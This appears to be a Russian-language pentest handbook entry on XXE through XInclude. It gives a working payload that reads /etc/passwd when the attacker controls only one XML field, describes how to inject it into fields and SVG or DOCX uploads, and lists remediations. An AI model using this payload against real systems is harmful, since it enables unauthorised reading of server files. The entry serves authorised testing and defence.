---
id: xxe-xinclude-fragment
title: "XInclude: XXE без контроля над DTD"
type: xxe
target: xml
category: web
difficulty: intermediate
bypass: filter
tags: [xxe, xinclude, soap]
tested_on: ["Java (XInclude enabled)", "libxml2 --xinclude"]
success_rate: 0.35
risk: high
cwe: "CWE-611"
lab: null
last_verified: "2026-10-23"
references:
  - "https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing"
graph:
  - target: "xxe"
    type: instance_of
  - target: "info-disclosure"
    type: leads_to
---

# XInclude: XXE без контроля над DTD

!!! warning "Этика"
    Только лаборатории `hackbook` или системы с письменным разрешением на тестирование.

## Payload
```
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include parse="text" href="file:///etc/passwd"/>
</foo>
```

## Explanation

Часто атакующий управляет не всем XML-документом, а лишь значением внутри него
(например, полем SOAP-запроса, которое сервер сам оборачивает в XML).
Тогда объявить `<!DOCTYPE` нельзя, но `XInclude` работает на уровне фрагмента:
он подключает внешний ресурс прямо из элемента. Требуется, чтобы парсер
поддерживал и не отключал XInclude.

## Detection

Внедрите `xi:include` в каждое поле, которое может попасть в XML.
Ответ с содержимым файла или ошибка XInclude = успех. Проверяйте также SVG/DOCX-загрузки:
это готовые XML-контейнеры.

## Remediation

- Отключить XInclude в парсере (Java: `setXIncludeAware(false)`, `setExpandEntityReferences(false)`).
- Запрет DTD.
- Для загружаемых Office/SVG-файлов: распаковка + санитизация XML, запрет внешних ссылок.
- Egress-фильтрация.
